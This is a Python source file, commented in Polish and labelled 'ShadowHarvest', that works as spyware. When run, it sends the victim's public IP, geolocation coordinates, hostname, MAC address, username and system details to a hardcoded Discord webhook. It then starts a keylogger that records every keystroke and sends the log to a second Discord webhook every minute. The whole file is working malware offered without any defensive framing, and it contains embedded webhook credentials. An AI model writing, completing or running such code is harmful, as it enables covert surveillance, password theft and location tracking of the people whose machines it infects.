import requests
import platform
import socket
import psutil
import uuid
import time
import os
from datetime import datetime
import keyboard
from threading import Timer

# Adresy webhooków Discord (wstaw swoje własne)
SYSTEM_WEBHOOK_URL = "https://discord.com/api/webhooks/1346878894522892409/vUwNq3y0wWqIToksAfLSahHVLMxn1X3onliWbCdbcA9B7Xiil9foBGSEtSk_sg04ypwl"  # Dla danych systemowych
KEYLOGGER_WEBHOOK_URL = "https://discord.com/api/webhooks/1346891173750636554/J3kKjhghWYb4u5hSD4qq_o1T-P6IFmkFviu3KmlN9PwkWBY8_aLcjphCyK4clJh172CG"  # Dla keyloggera

# Interwał wysyłania raportów keyloggera (w sekundach)
SEND_REPORT_EVERY = 60

# Funkcja do pobierania publicznego IP
def get_public_ip():
    try:
        ip = requests.get('https://api.ipify.org', timeout=5).text
        return ip
    except requests.RequestException:
        return "Nie udało się pobrać IP"

# Funkcja do pobierania danych geolokalizacyjnych
def get_geo_data(ip):
    try:
        geo_data = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
        return {
            "country": geo_data.get("country", "Nieznane"),
            "region": geo_data.get("regionName", "Nieznane"),
            "city": geo_data.get("city", "Nieznane"),
            "isp": geo_data.get("isp", "Nieznane"),
            "latitude": str(geo_data.get("lat", "Nieznane")),
            "longitude": str(geo_data.get("lon", "Nieznane")),
            "timezone": geo_data.get("timezone", "Nieznane")
        }
    except requests.RequestException:
        return {
            "country": "Nieznane",
            "region": "Nieznane",
            "city": "Nieznane",
            "isp": "Nieznane",
            "latitude": "Nieznane",
            "longitude": "Nieznane",
            "timezone": "Nieznane"
        }

# Funkcja do zbierania informacji o systemie
def get_system_info():
    try:
        os_info = f"{platform.system()} {platform.release()} ({platform.version()})"
        arch = platform.machine()
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        cpu_usage = psutil.cpu_percent(interval=1)
        ram = psutil.virtual_memory()
        ram_total = f"{ram.total / (1024 ** 3):.2f} GB"
        ram_used = f"{ram.used / (1024 ** 3):.2f} GB"
        disk = psutil.disk_usage('/')
        disk_total = f"{disk.total / (1024 ** 3):.2f} GB"
        disk_used = f"{disk.used / (1024 ** 3):.2f} GB"
        mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 2)][::-1])
        return {
            "os": os_info,
            "arch": arch,
            "hostname": hostname,
            "local_ip": local_ip,
            "cpu_usage": f"{cpu_usage}%",
            "ram_total": ram_total,
            "ram_used": ram_used,
            "disk_total": disk_total,
            "disk_used": disk_used,
            "mac_address": mac_address
        }
    except Exception:
        return {
            "os": "Nieznane",
            "arch": "Nieznane",
            "hostname": "Nieznane",
            "local_ip": "Nieznane",
            "cpu_usage": "Nieznane",
            "ram_total": "Nieznane",
            "ram_used": "Nieznane",
            "disk_total": "Nieznane",
            "disk_used": "Nieznane",
            "mac_address": "Nieznane"
        }

# Funkcja do zbierania dodatkowych informacji
def get_additional_info():
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    username = os.getlogin()
    process_count = len(psutil.pids())
    return {
        "timestamp": timestamp,
        "username": username,
        "process_count": str(process_count)
    }

# Funkcja wysyłająca dane systemowe
def send_system_report():
    public_ip = get_public_ip()
    geo_info = get_geo_data(public_ip)
    system_info = get_system_info()
    additional_info = get_additional_info()

    embed = {
        "title": "Raport systemowy",
        "description": "Szczegółowe informacje o systemie użytkownika.",
        "color": 0xFF0000,
        "timestamp": datetime.utcnow().isoformat(),
        "fields": [
            {"name": "🌐 Publiczny IP", "value": public_ip, "inline": True},
            {"name": "🌍 Kraj", "value": geo_info["country"], "inline": True},
            {"name": "🏙️ Miasto", "value": geo_info["city"], "inline": True},
            {"name": "📍 Region", "value": geo_info["region"], "inline": True},
            {"name": "📡 ISP", "value": geo_info["isp"], "inline": True},
            {"name": "📌 Współrzędne", "value": f"{geo_info['latitude']}, {geo_info['longitude']}", "inline": True},
            {"name": "⏰ Strefa czasowa", "value": geo_info["timezone"], "inline": True},
            {"name": "💻 System operacyjny", "value": system_info["os"], "inline": False},
            {"name": "🏠 Nazwa hosta", "value": system_info["hostname"], "inline": True},
            {"name": "🌐 Lokalny IP", "value": system_info["local_ip"], "inline": True},
            {"name": "🖥️ Architektura", "value": system_info["arch"], "inline": True},
            {"name": "⚙️ Użycie CPU", "value": system_info["cpu_usage"], "inline": True},
            {"name": "📊 RAM (użyto/całkowity)", "value": f"{system_info['ram_used']} / {system_info['ram_total']}", "inline": True},
            {"name": "💾 Dysk (użyto/całkowity)", "value": f"{system_info['disk_used']} / {system_info['disk_total']}", "inline": True},
            {"name": "🔗 Adres MAC", "value": system_info["mac_address"], "inline": False},
            {"name": "⏳ Czas uruchomienia", "value": additional_info["timestamp"], "inline": True},
            {"name": "👤 Użytkownik", "value": additional_info["username"], "inline": True},
            {"name": "📋 Liczba procesów", "value": additional_info["process_count"], "inline": True}
        ],
        "footer": {"text": "Wygenerowano przez ShadowHarvest"}
    }

    try:
        response = requests.post(SYSTEM_WEBHOOK_URL, json={"embeds": [embed]}, timeout=10)
        if response.status_code == 204:
            print("Dane systemowe wysłane!")
        else:
            print(f"Błąd wysyłania danych systemowych: Status {response.status_code}")
    except requests.RequestException as e:
        print(f"Błąd przy wysyłaniu danych systemowych: {e}")

# Klasa Keylogger
class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def report_to_webhook(self):
        if self.log:
            payload = {
                "content": f"Keylogger logs [{self.start_dt}]:\n```\n{self.log}\n```"
            }
            try:
                response = requests.post(KEYLOGGER_WEBHOOK_URL, json=payload, timeout=10)
                if response.status_code == 204:
                    print("[+] Keylogger: Dane wysłane!")
                else:
                    print(f"[-] Keylogger: Błąd wysyłania: {response.status_code}")
            except requests.RequestException as e:
                print(f"[-] Keylogger: Błąd przy wysyłaniu: {e}")

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.report_to_webhook()
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        print(f"{datetime.now()} - Rozpoczęto keylogger")
        keyboard.wait()

# Główna funkcja
if __name__ == "__main__":
    # Wyślij dane systemowe raz na start
    send_system_report()

    # Uruchom keylogger w tle
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()